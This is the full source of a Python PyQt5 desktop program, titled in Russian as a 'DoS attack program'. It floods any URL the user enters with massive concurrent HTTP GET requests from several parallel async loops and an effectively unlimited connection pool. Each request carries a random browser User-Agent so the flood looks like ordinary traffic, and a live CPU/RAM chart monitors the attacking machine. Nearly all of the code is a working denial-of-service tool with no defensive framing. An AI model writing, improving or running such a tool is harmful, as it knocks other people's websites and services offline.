import sys
import asyncio
import aiohttp
import time
import random
import logging
from PyQt5 import QtWidgets, QtCore
from PyQt5.QtCore import QThread, pyqtSignal
import qdarkstyle
import psutil
import pyqtgraph as pg
from multiprocessing import Process, Queue
from concurrent.futures import ThreadPoolExecutor

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def generate_headers():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
    ]
    return {
        "User-Agent": random.choice(user_agents),
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }

async def fetch(session, url):
    headers = generate_headers()
    try:
        async with session.get(url, headers=headers) as response:
            return await response.text()
    except Exception as e:
        logger.error(f"Ошибка при запросе к {url}: {e}")
        return None

async def main(url, num_requests, duration, queue):
    connector = aiohttp.TCPConnector(limit=10000000000000)
    async with aiohttp.ClientSession(connector=connector) as session:
        start_time = time.time()
        while time.time() - start_time < duration:
            tasks = [fetch(session, url) for _ in range(num_requests)]
            await asyncio.gather(*tasks)
            queue.put(1)
            await asyncio.sleep(0.1)

def run_async(url, num_requests, duration, queue):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(main(url, num_requests, duration, queue))
    loop.close()

class RequestWorker(QThread):
    finished = pyqtSignal(str)

    def __init__(self, url, num_requests, duration):
        super().__init__()
        self.url = url
        self.num_requests = num_requests
        self.duration = duration
        self.queue = Queue()

    def run(self):
        start_time = time.time()

        with ThreadPoolExecutor(max_workers=4) as executor:
            futures = []
            for _ in range(4):
                future = executor.submit(run_async, self.url, self.num_requests, self.duration, self.queue)
                futures.append(future)

            for future in futures:
                future.result()

        end_time = time.time()
        self.finished.emit(f"Запросы выполнены за {end_time - start_time:.2f} секунд.")

class SystemMonitor(QThread):
    update_signal = pyqtSignal(float, float)

    def __init__(self):
        super().__init__()
        self.running = True

    def run(self):
        while self.running:
            cpu_usage = psutil.cpu_percent(interval=0.1)
            ram_usage = psutil.virtual_memory().percent
            self.update_signal.emit(cpu_usage, ram_usage)
            time.sleep(0.5)

    def stop(self):
        self.running = False

class MainWindow(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Программа Dos Аттак")
        self.setGeometry(100, 100, 800, 600)

        widget = QtWidgets.QWidget()
        self.setCentralWidget(widget)

        layout = QtWidgets.QVBoxLayout()
        widget.setLayout(layout)

        self.url_entry = QtWidgets.QLineEdit(self)
        self.url_entry.setPlaceholderText("Введите URL")
        layout.addWidget(self.url_entry)

        self.requests_entry = QtWidgets.QLineEdit(self)
        self.requests_entry.setPlaceholderText("Количество запросов")
        layout.addWidget(self.requests_entry)

        self.duration_entry = QtWidgets.QLineEdit(self)
        self.duration_entry.setPlaceholderText("Длительность (секунды)")
        layout.addWidget(self.duration_entry)

        self.start_button = QtWidgets.QPushButton("Начать запросы", self)
        self.start_button.clicked.connect(self.start_requests)
        layout.addWidget(self.start_button)

        self.result_label = QtWidgets.QLabel("Результат будет здесь", self)
        layout.addWidget(self.result_label)

        self.graph_widget = pg.PlotWidget()
        layout.addWidget(self.graph_widget)

        self.graph_widget.setBackground("k")
        self.graph_widget.setLabel("left", "Использование (%)")
        self.graph_widget.setLabel("bottom", "Время (секунды)")
        self.graph_widget.setYRange(0, 100)
        self.graph_widget.addLegend()

        self.cpu_line = self.graph_widget.plot(pen="r", name="CPU")
        self.ram_line = self.graph_widget.plot(pen="b", name="RAM")

        self.time_data = []
        self.cpu_data = []
        self.ram_data = []

        self.monitor = SystemMonitor()
        self.monitor.update_signal.connect(self.update_graph)
        self.monitor.start()

    def start_requests(self):
        url = self.url_entry.text()
        num_requests = int(self.requests_entry.text())
        duration = int(self.duration_entry.text())

        self.worker = RequestWorker(url, num_requests, duration)
        self.worker.finished.connect(self.show_result)
        self.worker.start()

    def show_result(self, message):
        self.result_label.setText(message)

    def update_graph(self, cpu_usage, ram_usage):
        self.time_data.append(time.time())
        self.cpu_data.append(cpu_usage)
        self.ram_data.append(ram_usage)

        if len(self.time_data) > 100:
            self.time_data.pop(0)
            self.cpu_data.pop(0)
            self.ram_data.pop(0)

        self.cpu_line.setData(self.time_data, self.cpu_data)
        self.ram_line.setData(self.time_data, self.ram_data)

    def closeEvent(self, event):
        self.monitor.stop()
        self.monitor.wait()
        event.accept()

if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())